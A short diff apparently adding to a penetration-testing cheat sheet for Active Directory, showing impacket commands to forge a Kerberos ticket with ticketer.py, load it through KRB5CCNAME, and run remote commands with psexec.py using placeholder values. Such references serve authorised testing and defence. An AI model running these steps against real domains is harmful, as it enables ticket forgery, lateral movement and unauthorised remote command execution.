@@ -285,6 +285,15 @@ python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain
 ```bash
 python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> <user>
 ```
+#### Set the ticket for impacket use
+```bash
+export KRB5CCNAME=<TGS_ccache_file>
+```
+
+#### Execute remote commands with any of the following by using the TGT
+```bash
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+```
 
 ## SMB VEV
 ### Mount share
